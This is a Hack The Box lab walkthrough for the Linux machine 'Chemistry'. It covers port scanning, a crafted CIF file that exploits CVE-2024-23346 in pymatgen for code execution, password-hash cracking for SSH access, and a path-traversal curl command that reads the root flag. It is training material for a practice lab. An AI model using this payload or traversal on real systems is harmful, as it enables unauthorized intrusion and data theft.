---
date: 2025-03-12
categories: [Linux, Easy]
---

![Chemistry](https://labs.hackthebox.com/storage/avatars/b8f3d660af2d3ed0929eb119e33526cf.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [FisMatHack](https://app.hackthebox.com/users/1076236)        | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---







- - I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found
    
    ```python
    nmap -p- --open -vvv --min-rate 5000 -Pn -sS 10.10.11.35 -oG scan
    /opt/extractports scan
    nmap -p22,5000 -sCV -Pn 10.10.11.38 -oN ports
    ```
    
    ![image](https://github.com/user-attachments/assets/97b4d39c-24fd-4d9f-8ee0-fc0a1bceda7e)
    
- I search the website and find a page that allows me to upload a file. I try several things but I don't get anything
    
    ![image](https://github.com/user-attachments/assets/c89dca0a-41e0-41e7-8713-5b02e009cdaa)

- Searching for possible libraries I find the one being used and see that it has a vulnerability. Thanks to it I can execute remote code. [CVE-2024-23346](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

	```jsx
	data_5yOhtAoR
	_audit_creation_date            2018-06-08
	_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
	
	loop_
	_parent_propagation_vector.id
	_parent_propagation_vector.kxkykz
	k1 [0 0 0]
	
	_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("python3 -m http.server 9988");0,0,0'
	
	_space_group_magn.number_BNS  62.448
	_space_group_magn.name_BNS  "P  n'  m  a'  "
	```
	
   ![image](https://github.com/user-attachments/assets/5f62676f-8f88-4b22-88ac-39d3f781d104)
    
- When sharing directories I can find a file containing a database with users and passwords. As I have also found users that match the existing ones on the system, I crack the hash and manage to log in via ssh as the rosa user and I can read the first flag.
    
    ![image](https://github.com/user-attachments/assets/59de1f42-26d5-4eb8-b418-c3f9d0a1c1a5)
    
- I list the open ports and find one that is not exposed to the outside. 
    
    ![image](https://github.com/user-attachments/assets/06a27799-c21a-46b3-aa2f-312259bb6f84)
    
    ![image](https://github.com/user-attachments/assets/a0e5e22f-a934-4e90-a78e-efcf1f3ec402)
    
- I try to read files from the system using path traversal and I manage to read the second flag

    ![image](https://github.com/user-attachments/assets/6dba208f-5108-49d8-9adf-02daab10a0fb)
    
	```jsx
	 curl --path-as-is <http://127.0.0.1:8080/assets/../../../../../root/root.txt>
	```
	
	![image](https://github.com/user-attachments/assets/0652e40d-c654-4a95-9f26-800d21d11e1c)

